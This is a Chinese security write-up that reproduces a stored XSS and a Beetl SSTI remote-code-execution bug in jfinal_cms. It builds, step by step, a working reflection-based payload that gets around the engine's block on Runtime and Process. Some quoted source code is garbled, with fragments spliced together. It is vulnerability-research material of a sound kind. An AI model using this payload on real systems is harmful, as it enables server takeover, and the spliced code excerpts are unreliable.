* * *
# 存储型XSS漏洞
* * *
## 漏洞分析
漏洞源码存在于`E:\Soures\jfinal_cms\src\main\java\com\jflyfox\modules\front\controller\PersonController.java`  
第一部分功能有以下几个：
  1. 将提交数据Json化
  2. 根据用户Session判断用户id（数据库内的id）
  3. 判断旧密码和新设置的密码是否正确
  4. 判断Email的格式是否正确
        public void save() {
         JSONObject json = new JSONObject();
         json.put("status", 2);// 失败
         SysUser user = (SysUser) getSessionUser();
         int userid = user.getInt("userid");
         SysUser model = getModel(SysUser.class);
         if (userid != model.getInt("userid")) {
             json.put("msg", "提交数据错误！");
             renderJson(json.toJSONString());
             return;
         }
         // 第三方用户不需要密码
         if (user.getInt("usertype") != 4) {
             String oldPassword = getPara("old_password");
             String newPassword = getPara("new_password");
             String newPassword2 = getPara("new_password2");
             if (!user.getStr("password").equals(JFlyFoxUtils.passwordEncrypt(oldPassword))) {
                 json.put("msg", "密码错误！");
                 renderJson(json.toJSONString());
                 return;
             }
             if (StrUtils.isNotEmpty(newPassword) && !newPassword.equals(newPassword2)) {
                 json.put("msg", "两次新密码不一致！");
                 renderJson(json.toJSONString());
                 return;
             } else if (StrUtils.isNotEmpty(newPassword)) { // 输入密码并且一直
                 model.set("password", JFlyFoxUtils.passwordEncrypt(newPassword));
             }
         }
         if (StrUtils.isNotEmpty(model.getStr("email")) && model.getStr("email").indexOf("@")  paras = new ArrayList();
            config.dialect.forModelUpdate(table, attrs, _getModifyFlag(), sql, paras);
            if (paras.size() = 1) {
                    _getModifyFlag().clear();
                    return true;
                }
                return false;
            } catch (Exception e) {
                throw new ActiveRecordException(e);
            } finally {
                config.close(conn);
            }
        }
        /**
* * *
## 总结
  1. 我们可以看到整个数据更新的过程，我们没有看到任何的防护措施，过滤字符手段。
* * *
# SSTI模板注入漏洞
## 前言
感谢长亭科技大佬@Lilc耐心指导，这个漏洞也是这位大佬挖的，我只是漏洞复现并给大家分享一下笔者构造SSTI模板注入漏洞payload经验。
* * *
漏洞存在的位置在管理员后台模板修改下，可以修改模板代码，插入恶意代码等操作。插入一段恶意代码可导致远程代码执行。
* * *
### 漏洞详情
* * *
### 漏洞分析
点击保存页面的首先会进入到`E:\Soures\jfinal_cms\src\main\java\com\jflyfox\modules\filemanager\FileManagerController.java`然后判断请求方法，是POST方法会判断是upload还是saveFile，如果是saveFile方法会跳转到`E:\Soures\jfinal_cms\src\main\java\com\jflyfox\modules\filemanager\FileManager.java`中的saveFile方法。  
    public JSONObject saveFile() {
            JSONObject array = new JSONObject();
            try {
                String content = this.get.get("content");
                content = FileManagerUtils.decodeContent(content);
                // before bakup
                bakupFile(new File(getRealFilePath()));
                FileManagerUtils.writeString(getRealFilePath(), content);
                array.put("Path", this.get.get("path"));
                array.put("Error", "");
                array.put("Code", 0);
            } catch (JSONException e) {
                logger.error("JSONObject error", e);
                this.error("JSONObject error");
            } catch (IOException e) {
                logger.error("IOException error", e);
                this.error("IOException error");
            }
            return array;
        }
前期可以修改代码机制我们已经了解的很清楚了，没有做任何的防护措施。但这些远远达不到SSTI的要求。`判断一个系统或者CMS是否使用了任何一个模板引擎`，先有比较大众Java模板引擎有Velocity，Freemarker，而这款模板引擎是beetl，挖掘之间根本没有了解过。据查阅知道，这是一款国产的模板引擎。[官方地址](http://ibeetl.com/)，官网说有很多优势，感觉一般般，吹牛的水分比较大吧。在研究这个模板的时候，官方给[文档](http://ibeetl.com/guide/#/beetl/)真的很差，有些东西说的一知半解没有说清楚。  
* * *
#### 知识补充
查阅官方文档，了解这款模板引擎调用Java方法和属性模式。  
本文构造payload得有简单Java的反射机制基础。[推荐文章](https://www.cnblogs.com/haha12/p/4724204.html)，文章中用了一个简单案例再现了Java的反射。[推荐文章](https://blog.csdn.net/SECURE2/article/details/81099574?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1),文章用很多解释是关于Java反射和类加载的知识内容。[新增][推荐视频](https://www.bilibili.com/video/BV1s4411U7x9?from=search&seid=13854513651556834308)  
[video(video-hkteTk7M-1587384668444)(type-bilibili)(url-)]
#### Payload构造
这里笔者将payload拆解了，方便更好的解读一下payload。由于beetl模板引擎禁止了`java.lang.Runtime`和`java.lang.Process`，所以这里不能直接调用进程来达到远程代码执行的效果。这里采用Java反射机制来达到效果，当然也有其他的方法，比例写文件等。读者们可以自行尝试。
    ${@java.lang.Class.forName("java.lang.Runtime").getMethod("exec",
    @java.lang.Class.forName("java.lang.String")).invoke(
    @java.lang.Class.forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null),"calc")}
**先忽视上面的payload，下面会一步步解答，最后完整的payload**  
  1. 我们且看第一行，按照上面给出简单案例方法，我们应该这样子就可以了`@java.lang.Class.forName("java.lang.Runtime").getMethod("exec",String.class).invoke(newInstance(),"calc")`
  2. 但是直接String.class直接写模板是找不到的，所以我们得继续构造payload，将String.class转化`@java.lang.Class.forName("java.lang.String")`的形式，然后payload就变成下面这样子了。`@java.lang.Class.forName("java.lang.Runtime").getMethod("exec",@java.lang.Class.forName("java.lang.String")).invoke(newInstance(),"calc")`
  3. 照道理上面就可以直接使用了，但是呢Runtime类没有无参构造方法，因此不能使用newInstance()方法来实例化。只能通过调用getRuntime()方法来进行实例化。所以newInstance()得替换成`@java.lang.Class.forName("java.lang.Runtime").getMethod("getRuntime",null)`最终payload就变成了下面这样子。
        ${@java.lang.Class.forName("java.lang.Runtime").getMethod("exec",@java.lang.Class.forName("java.lang.String")).invoke(@java.lang.Class.forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null),"calc")}
* * *
# 总结
遇到使用了模板的解析CMS可以根据模板解析语言尝试执行命令，若遇到函数警用的情况可以尝试一些Bypass方法，比例一些反射、反序列化、字节码修改等。SSTI注入难的其实如何构造Payload，构造好了之后一切自然而然了。
* * *
# 参考